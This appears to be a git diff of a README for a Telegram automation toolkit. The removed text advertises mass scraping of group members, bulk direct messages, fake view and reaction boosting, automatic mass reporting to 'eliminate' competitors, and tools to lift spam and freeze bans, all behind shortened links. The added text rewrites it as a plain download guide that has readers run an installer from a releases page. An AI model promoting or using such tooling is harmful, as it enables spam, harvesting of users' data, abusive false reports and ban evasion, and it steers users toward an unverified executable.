@@ -1,72 +1,91 @@
-🚀 A comprehensive Telegram marketing automation suite featuring 43+ tools, including Member Adder, Scraper, Mass DM, Forwarder, and API ID Creator.
+# 🚀 Telegram-Automation-Toolkit - Simplify Your Telegram Marketing Tasks
 
-[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)]()
-[![Telegram API](https://img.shields.io/badge/Telegram-API-blue)]()
-[![Proxy Support](https://img.shields.io/badge/Proxy-Supported-green)]()
-[![License](https://img.shields.io/badge/license-MIT-green)]()
+![Download Now](https://img.shields.io/badge/Download%20Now-Here-007FFF)
 
-# GET HERE: https://shorturl.at/TI7Vt
-## For any questions: https://shorturl.at/pfRnW
+## 🚀 Getting Started
 
-### TelegramTool #TelegramMarketing #TelegramBot #Automation
+Welcome to the **Telegram-Automation-Toolkit**! This tool helps you automate various tasks on Telegram, making it easier for you to manage your marketing activities. You can easily add members, scrape data, send messages, and much more—all with just a few clicks.
 
-## ✨ Nearly 50 Capabilities
+## 📥 Download & Install
 
-<img src='UI1.png' width='450'>
+To get started, you will need to download the software. Follow these steps:
 
-### 👥 Member Administration
-- **Telegram Member Adder** - Include users into groups/channels
-![](add.gif)
-- **Active Member Scanner** - Detect the most active participants
-- **Telegram Scraper** - Pull members from groups/channels (+200k)
-- **User Extractor** - Export user databases (+200k)
-- **Member Filter** - Sort users by activity, date, premium status, etc.
-![](scrap.gif)
-- **Clone/Copy Targets** - Duplicate any target in real-time.
-![](copy.gif)
+1. **Visit the Releases Page**
+   Click this link to visit the release page: [Download Here](https://github.com/Shivam00980/Telegram-Automation-Toolkit/releases).
 
-### ❌ Removal of Competition
-- **Automatic Re ports** - Eliminate any targets (users, groups, channels) automatically using specific reasons.
+2. **Choose Your Version**
+   On the releases page, you will see a list of available versions. Each version may include different features. Review any notes associated with the version you want to download.
 
-### 📢 Bulk Messaging
-![](mass.gif)
-- **Mass DM Sender** - Bulk direct messaging
-- **Message Forwarder** - Share messages across groups
-- **Forward Old Messages** - Archive and relay historical messages
-- **Forward Messages Realtime** - Instant message transfer between chats
-- **Realtime Message Scraper** - Capture all incoming new messages
-- **Complete Message Scraper** - Scrape all old messages from groups/channels
-- **Auto Reply** - Automated response system
-- **Scheduled Messaging** - Time-based message delivery
-- **Automatic Polls** - Generate and manage polls automatically
-- **Message Templates** - Create and reuse message templates
-- **Multi-Language Support** - Send messages in various languages
-- **Media Attachment** - Support for files, images, and videos
-- **HTML Formatting** - Rich text message capabilities
+3. **Download the Application**
+   Click on the download link for your desired version. It will be a file that you can run on your computer. 
 
-### 🚀 Engagement Enhancement
-- **Increase Views** - Boost post visibility and view counts
-![](view_post.gif)
-- **Reactions Bot** - Automatic emoji reactions to posts
-- **View Booster** - Improve content visibility
-- **Group/Channel Finder** - Discover links for groups/channels using your keywords.
-- **Hashtag Optimizer** - Automatic hashtag research
+4. **Run the Installer**
+   Once the download is complete, locate the file in your Downloads folder. Double-click the file to start the installation process.
+   - Follow the prompts in the installation wizard to complete the installation.
 
-### 🔐 Account Handling
-- **API ID Creator** - Generate Telegram API credentials
-- **Session Manager** - Manage multiple accounts
-![](log_in.gif)
-- **Proxy Supported** - Full proxy integration (HTTP/SOCKS)
-- **Auto-Joiner** - Join any target automatically with every account.
-![](join.gif)
-- **Auto-Leaver** - Leave any target automatically with every account
-- **Ban-Checker** - Verify if accounts are banned and clean your list.
-- **Spam-Checker** - Check if your accounts are ready to go.
-- **Frozen-Checker** - Check if your accounts are ready to go. (New from TG)
-- **Unspam Accounts** - Remove any limits.
-- **Unfreeze Accounts** - Remove the Frozen status of your accounts.
+## 🛠️ Features
 
-### AND MUCH MORE!
+The **Telegram-Automation-Toolkit** comes packed with over 43 tools, designed to help you streamline your Telegram marketing efforts. Here are some key features:
 
-# GET HERE: https://shorturl.at/TI7Vt
-## For any questions: https://shorturl.at/pfRnW
+- **Member Adder**
+  Easily add members to your Telegram groups.
+  
+- **Scraper**
+  Gather data from Telegram channels quickly.
+
+- **Mass DM**
+  Send direct messages to multiple users in one go.
+
+- **Forwarder**
+  Automatically forward messages between different chats.
+
+- **API ID Creator**
+  Generate API IDs for your Telegram bots.
+
+## 📊 System Requirements
+
+To ensure smooth operation, make sure your system meets the following minimum requirements:
+
+- **Operating System:** Windows 10 or later, MacOS
+- **Memory:** At least 4GB of RAM
+- **Disk Space:** Minimum of 200MB free space
+- **Internet Access:** Required for initial setup and updates
+
+## 🔧 How to Use the Toolkit
+
+Once you have installed the toolkit, follow these steps to start using its features:
+
+1. **Open the Application**
+   Locate the application on your computer and open it.
+
+2. **Login to Telegram**
+   You will need to log in to your Telegram account. Follow the on-screen instructions for a secure login.
+
+3. **Select a Tool**
+   After logging in, you will see a dashboard with various tools. Click on the tool you wish to use.
+
+4. **Follow Instructions**
+   Each tool will have detailed instructions. Make sure to read them carefully to understand how to use that specific feature.
+
+5. **Save Your Work**
+   After using any tools, be sure to save your settings or data if required.
+
+## 📊 Frequently Asked Questions
+
+### How do I update the application?
+
+To update the toolkit, simply revisit the [Releases Page](https://github.com/Shivam00980/Telegram-Automation-Toolkit/releases) and download the latest version. Run the installer as you did before, and it will update your existing installation.
+
+### Can I use this toolkit on a mobile device?
+
+Currently, the **Telegram-Automation-Toolkit** is designed for desktop use only. You can run it on your Windows PC or Mac.
+
+### What should I do if I encounter an error during installation?
+
+If you face any problems, ensure that your operating system meets the requirements. You can also check forums or communities for troubleshooting tips.
+
+## 📞 Support
+
+If you have any questions or need further assistance, feel free to reach out. You can place your inquiries in the Issues section of the repository on GitHub, or check the community discussions for helpful tips from other users.
+
+Thank you for using **Telegram-Automation-Toolkit**. Enjoy making your Telegram marketing tasks easier and more efficient!
